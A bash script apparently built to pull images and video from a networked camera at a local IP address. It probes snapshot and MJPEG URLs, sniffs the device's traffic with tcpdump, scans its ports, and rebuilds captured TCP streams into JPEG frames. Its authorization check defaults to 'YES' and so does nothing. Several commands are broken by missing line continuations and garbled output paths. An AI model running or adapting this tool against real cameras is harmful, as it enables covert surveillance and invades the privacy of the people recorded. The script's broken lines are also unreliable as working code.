#!/usr/bin/env bash
set -Eeuo pipefail
IFS=$'\n\t'

TARGET_IP="${TARGET_IP:-192.168.0.29}"
IFACE="${IFACE:-wlan0}"
CAPTURE_TIME="${CAPTURE_TIME:-600}"
CONFIRM_AUTH="${CONFIRM_AUTH:-YES}"

[[ "$CONFIRM_AUTH" != "YES" ]] && echo "Set CONFIRM_AUTH=YES" && exit 1

SCRIPT_NAME="ghost_nr14_visual_intel"
RUN_ID="$(date +%Y%m%d_%H%M%S)"
ROOT="./evidence/${SCRIPT_NAME}_${RUN_ID}"
PCAP="$ROOT/pcap/capture.pcap"

mkdir -p "$ROOT"/{pcap,analysis,streams,images,video,report,logs,tmp,capability}

LOG="$ROOT/report/tests.tsv"
SUMMARY="$ROOT/report/summary.txt"

echo -e "TIME\tTEST\tSTATUS\tDETAILS" > "$LOG"

log(){ echo "[$(date +%T)] $*"; }
test_log(){ echo -e "$(date)\t$1\t$2\t$3" >> "$LOG"; }

# -------------------- ACTIVE TRIGGER --------------------

log "[NR14] Triggering device activity"

for p in "/" "/snapshot.jpg" "/image.jpg" "/video.mjpg" "/cgi-bin/snapshot.cgi"; do
curl -s -k --max-time 2 "http://$TARGET_IP$p" >/dev/null 2>&1 || true
done

ping -c 3 "$TARGET_IP" >/dev/null 2>&1 || true

# -------------------- CAPTURE FIX --------------------

log "[T1] Smart capture"

timeout "$CAPTURE_TIME" tcpdump -i "$IFACE" -nn -s0 -w "$PCAP" 
host "$TARGET_IP" or arp or port 80 or port 443 or port 554 or port 8000 or port 8080 \

> "$ROOT/logs/tcpdump.log" 2>&1 || true

SIZE=$(wc -c < "$PCAP" || echo 0)
test_log "CAPTURE" "PASS" "Size=$SIZE"

# -------------------- DEVICE FINGERPRINT --------------------

log "[T2] Fingerprinting device"

nmap -Pn -p 80,443,554,8000,8080 "$TARGET_IP" -oN "$ROOT/analysis/nmap.txt" >/dev/null 2>&1 || true

PORTS=$(grep "open" "$ROOT/analysis/nmap.txt" | awk '{print $1}' | tr '\n' ' ')

STREAM_TYPE="UNKNOWN"

if echo "$PORTS" | grep -q "554"; then
STREAM_TYPE="RTSP"
elif echo "$PORTS" | grep -qE "80|8080|8000"; then
STREAM_TYPE="HTTP"
fi

# -------------------- HTTP PROBE --------------------

log "[T3] Snapshot probing"

IMG_FOUND=0

for path in "/snapshot.jpg" "/image.jpg" "/video.mjpg"; do
out="$ROOT/images/http_$(echo $path | tr '/' '_').bin"
curl -s -k --max-time 5 "http://$TARGET_IP$path" -o "$out" || true

if file "$out" | grep -qi "image"; then
mv "$out" "${out}.jpg"
IMG_FOUND=$((IMG_FOUND+1))
STREAM_TYPE="SNAPSHOT"
else
rm -f "$out"
fi
done

# -------------------- RTSP CHECK --------------------

RTSP_OK=0
if command -v ffprobe >/dev/null; then
ffprobe "rtsp://$TARGET_IP:554" > "$ROOT/logs/rtsp.txt" 2>&1 && RTSP_OK=1 || true
fi

if [[ "$RTSP_OK" == "1" ]]; then
STREAM_TYPE="RTSP"
fi

# -------------------- STREAM RECONSTRUCTION --------------------

log "[T4] Stream reconstruction"

mkdir -p "$ROOT/streams/rebuilt"

tshark -r "$PCAP" -T fields -e tcp.stream | sort -n | uniq > "$ROOT/tmp/streams.txt"

while read -r sid; do
out="$ROOT/streams/rebuilt/stream_$sid.bin"

tshark -r "$PCAP" -Y "tcp.stream==$sid && tcp.len>0" 
-T fields -e tcp.payload 
| tr -d ':\n\r ' | xxd -r -p > "$out" 2>/dev/null || true

if command -v ffmpeg >/dev/null; then
ffmpeg -y -f mjpeg -i "$out" -frames:v 2 "$ROOT/images/stream_${sid}*%02d.jpg" 
> "$ROOT/logs/ffmpeg*$sid.log" 2>&1 || true
fi

done < "$ROOT/tmp/streams.txt"

# -------------------- VALIDATE IMAGES --------------------

log "[T5] Validation"

REAL_IMG=0

for f in "$ROOT"/images/*; do
[[ -f "$f" ]] || continue
if file "$f" | grep -qi "image"; then
REAL_IMG=$((REAL_IMG+1))
else
rm -f "$f"
fi
done

# -------------------- CLASSIFIER --------------------

log "[T6] Classification engine"

EXTRACTION="NO"

if [[ "$REAL_IMG" -gt 0 ]]; then
EXTRACTION="YES"
elif [[ "$STREAM_TYPE" == "RTSP" ]]; then
EXTRACTION="YES (requires auth or timing)"
elif [[ "$STREAM_TYPE" == "HTTP" ]]; then
EXTRACTION="LIMITED"
else
STREAM_TYPE="CLOUD_ONLY"
EXTRACTION="NO"
fi

# -------------------- REPORT --------------------

cat > "$SUMMARY" <<EOF

NR14 VISUAL INTELLIGENCE REPORT

Target: $TARGET_IP

Detected streaming type:
$STREAM_TYPE

Image extraction possible:
$EXTRACTION

Images recovered:
$REAL_IMG

PCAP size:
$SIZE bytes

Interpretation:

* RTSP → Local stream likely available
* SNAPSHOT → Direct extraction possible
* HTTP → Weak extraction
* CLOUD_ONLY → Encrypted streaming (no recovery possible)

EOF

log "=== COMPLETE ==="
echo "Report: $SUMMARY"
